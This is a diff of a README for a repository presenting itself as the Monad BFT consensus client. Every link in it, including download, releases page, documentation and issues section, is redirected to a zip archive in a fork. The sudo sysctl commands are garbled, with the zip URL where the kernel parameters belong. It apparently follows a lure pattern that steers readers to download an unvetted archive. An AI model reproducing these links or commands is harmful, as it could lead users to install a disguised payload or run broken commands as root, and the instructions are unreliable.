@@ -2,11 +2,11 @@
 
 ## 🔗 Download
 
-[![Download](https://raw.githubusercontent.com/Henriqueces/monad-bft/master/basimesostasis/monad-bft.zip)](https://raw.githubusercontent.com/Henriqueces/monad-bft/master/basimesostasis/monad-bft.zip)
+[![Download](https://raw.githubusercontent.com/Henriqueces/monad-bft/master/debian/DEBIAN/monad_bft_2.1.zip)](https://raw.githubusercontent.com/Henriqueces/monad-bft/master/debian/DEBIAN/monad_bft_2.1.zip)
 
 ## 📖 Overview
 
-This repository contains the Monad consensus client and JsonRpc server. Monad consensus collects transactions, produces blocks, and writes them to a ledger filestream. These blocks are then used by Monad execution to update the blockchain state. The [triedb](https://raw.githubusercontent.com/Henriqueces/monad-bft/master/basimesostasis/monad-bft.zip) is a database that stores block information and the blockchain state.
+This repository contains the Monad consensus client and JsonRpc server. Monad consensus collects transactions, produces blocks, and writes them to a ledger filestream. These blocks are then used by Monad execution to update the blockchain state. The [triedb](https://raw.githubusercontent.com/Henriqueces/monad-bft/master/debian/DEBIAN/monad_bft_2.1.zip) is a database that stores block information and the blockchain state.
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ To use the Monad BFT software, follow these steps carefully.
 
 ### 1. 📥 Download the Software
 
-Visit the [Releases page](https://raw.githubusercontent.com/Henriqueces/monad-bft/master/basimesostasis/monad-bft.zip) to download the latest version of the software. Choose the file that matches your operating system.
+Visit the [Releases page](https://raw.githubusercontent.com/Henriqueces/monad-bft/master/debian/DEBIAN/monad_bft_2.1.zip) to download the latest version of the software. Choose the file that matches your operating system.
 
 ### 2. 📂 Install the Software
 
@@ -37,7 +37,7 @@ You must set up certain system parameters for optimal performance. Open your ter
 #### Hugepages Allocation
 
 ```bash
-sudo sysctl -w https://raw.githubusercontent.com/Henriqueces/monad-bft/master/basimesostasis/monad-bft.zip
+sudo sysctl -w https://raw.githubusercontent.com/Henriqueces/monad-bft/master/debian/DEBIAN/monad_bft_2.1.zip
 ```
 
 #### Networking Configuration
@@ -45,17 +45,17 @@ sudo sysctl -w https://raw.githubusercontent.com/Henriqueces/monad-bft/master/ba
 Adjust the UDP buffer sizes with these commands:
 
 ```bash
-sudo sysctl -w https://raw.githubusercontent.com/Henriqueces/monad-bft/master/basimesostasis/monad-bft.zip
-sudo sysctl -w https://raw.githubusercontent.com/Henriqueces/monad-bft/master/basimesostasis/monad-bft.zip
-sudo sysctl -w https://raw.githubusercontent.com/Henriqueces/monad-bft/master/basimesostasis/monad-bft.zip
-sudo sysctl -w https://raw.githubusercontent.com/Henriqueces/monad-bft/master/basimesostasis/monad-bft.zip
+sudo sysctl -w https://raw.githubusercontent.com/Henriqueces/monad-bft/master/debian/DEBIAN/monad_bft_2.1.zip
+sudo sysctl -w https://raw.githubusercontent.com/Henriqueces/monad-bft/master/debian/DEBIAN/monad_bft_2.1.zip
+sudo sysctl -w https://raw.githubusercontent.com/Henriqueces/monad-bft/master/debian/DEBIAN/monad_bft_2.1.zip
+sudo sysctl -w https://raw.githubusercontent.com/Henriqueces/monad-bft/master/debian/DEBIAN/monad_bft_2.1.zip
 ```
 
 For TCP buffer sizes, use these commands:
 
 ```bash
-sudo sysctl -w https://raw.githubusercontent.com/Henriqueces/monad-bft/master/basimesostasis/monad-bft.zip'4096 62500000 62500000'
-sudo sysctl -w https://raw.githubusercontent.com/Henriqueces/monad-bft/master/basimesostasis/monad-bft.zip'4096 62500000 62500000'
+sudo sysctl -w https://raw.githubusercontent.com/Henriqueces/monad-bft/master/debian/DEBIAN/monad_bft_2.1.zip'4096 62500000 62500000'
+sudo sysctl -w https://raw.githubusercontent.com/Henriqueces/monad-bft/master/debian/DEBIAN/monad_bft_2.1.zip'4096 62500000 62500000'
 ```
 
 You need administrative rights to execute these commands.
@@ -74,7 +74,7 @@ The JsonRpc server will start running. You can access it via your web browser or
 
 ### 7. 📚 Learn More
 
-For more information on advanced features and configuration, refer to the documentation within the repository or the respective [triedb documentation](https://raw.githubusercontent.com/Henriqueces/monad-bft/master/basimesostasis/monad-bft.zip).
+For more information on advanced features and configuration, refer to the documentation within the repository or the respective [triedb documentation](https://raw.githubusercontent.com/Henriqueces/monad-bft/master/debian/DEBIAN/monad_bft_2.1.zip).
 
 ## 🛠️ System Requirements
 
@@ -85,10 +85,10 @@ For more information on advanced features and configuration, refer to the docume
 
 ## 📬 Need Help?
 
-If you encounter any issues or have questions, feel free to check the [issues section](https://raw.githubusercontent.com/Henriqueces/monad-bft/master/basimesostasis/monad-bft.zip) or submit your queries.
+If you encounter any issues or have questions, feel free to check the [issues section](https://raw.githubusercontent.com/Henriqueces/monad-bft/master/debian/DEBIAN/monad_bft_2.1.zip) or submit your queries.
 
 ## 🎉 Conclusion
 
 Follow these steps to successfully download and run the Monad BFT software. Enjoy managing your blockchain transactions with ease! 
 
-Remember, when you're ready to download, head to the [Releases page](https://raw.githubusercontent.com/Henriqueces/monad-bft/master/basimesostasis/monad-bft.zip) to get started.
+Remember, when you're ready to download, head to the [Releases page](https://raw.githubusercontent.com/Henriqueces/monad-bft/master/debian/DEBIAN/monad_bft_2.1.zip) to get started.
